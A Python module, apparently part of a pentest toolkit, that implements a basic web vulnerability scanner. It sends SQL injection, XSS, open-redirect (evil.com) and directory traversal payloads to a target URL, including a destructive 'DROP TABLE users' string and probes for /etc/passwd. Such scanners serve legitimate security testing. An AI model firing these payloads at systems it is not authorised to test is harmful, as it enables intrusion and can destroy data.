import socket
import requests
from .utils import Logger

class Exploit:
    def __init__(self):
        self.logger = Logger()
        self.vulnerabilities = {
            'sql_injection': self._check_sql_injection,
            'xss': self._check_xss,
            'open_redirect': self._check_open_redirect,
            'directory_traversal': self._check_directory_traversal
        }

    def scan_vulnerabilities(self, target, checks=None):
        """Führt Vulnerability Checks durch"""
        results = {}
        checks = checks or self.vulnerabilities.keys()
        
        for check in checks:
            if check in self.vulnerabilities:
                try:
                    result = self.vulnerabilities[check](target)
                    results[check] = result
                except Exception as e:
                    self.logger.error(f"Vulnerability Check fehlgeschlagen: {e}")
                    results[check] = {'vulnerable': False, 'error': str(e)}
        
        return results

    def _check_sql_injection(self, target):
        """Testet auf SQL Injection Schwachstellen"""
        payloads = ["'", "1' OR '1'='1", "1; DROP TABLE users"]
        vulnerable = False
        
        for payload in payloads:
            try:
                url = f"{target}?id={payload}"
                response = requests.get(url)
                
                # Suche nach typischen SQL-Fehlermeldungen
                error_patterns = [
                    "sql syntax",
                    "mysql_fetch",
                    "ORA-",
                    "SQL Server"
                ]
                
                for pattern in error_patterns:
                    if pattern.lower() in response.text.lower():
                        vulnerable = True
                        break
            except:
                continue
        
        return {
            'vulnerable': vulnerable,
            'type': 'SQL Injection',
            'description': 'Mögliche SQL Injection gefunden'
        }

    def _check_xss(self, target):
        """Testet auf XSS Schwachstellen"""
        payloads = [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "javascript:alert(1)"
        ]
        
        vulnerable = False
        for payload in payloads:
            try:
                url = f"{target}?q={payload}"
                response = requests.get(url)
                
                if payload in response.text:
                    vulnerable = True
                    break
            except:
                continue
        
        return {
            'vulnerable': vulnerable,
            'type': 'Cross-Site Scripting',
            'description': 'Mögliche XSS-Schwachstelle gefunden'
        }

    def _check_open_redirect(self, target):
        """Testet auf Open Redirect Schwachstellen"""
        test_urls = [
            "https://evil.com",
            "//evil.com",
            "\\evil.com"
        ]
        
        vulnerable = False
        for url in test_urls:
            try:
                test_url = f"{target}?redirect={url}"
                response = requests.get(test_url, allow_redirects=False)
                
                if response.status_code in [301, 302]:
                    location = response.headers.get('Location', '')
                    if url in location:
                        vulnerable = True
                        break
            except:
                continue
        
        return {
            'vulnerable': vulnerable,
            'type': 'Open Redirect',
            'description': 'Mögliche Open Redirect Schwachstelle gefunden'
        }

    def _check_directory_traversal(self, target):
        """Testet auf Directory Traversal Schwachstellen"""
        payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\win.ini",
            "%2e%2e%2f%2e%2e%2f"
        ]
        
        vulnerable = False
        for payload in payloads:
            try:
                url = f"{target}?file={payload}"
                response = requests.get(url)
                
                sensitive_patterns = [
                    "root:",
                    "[extensions]",
                    "boot loader"
                ]
                
                for pattern in sensitive_patterns:
                    if pattern in response.text:
                        vulnerable = True
                        break
            except:
                continue
        
        return {
            'vulnerable': vulnerable,
            'type': 'Directory Traversal',
            'description': 'Mögliche Directory Traversal Schwachstelle gefunden'
        } 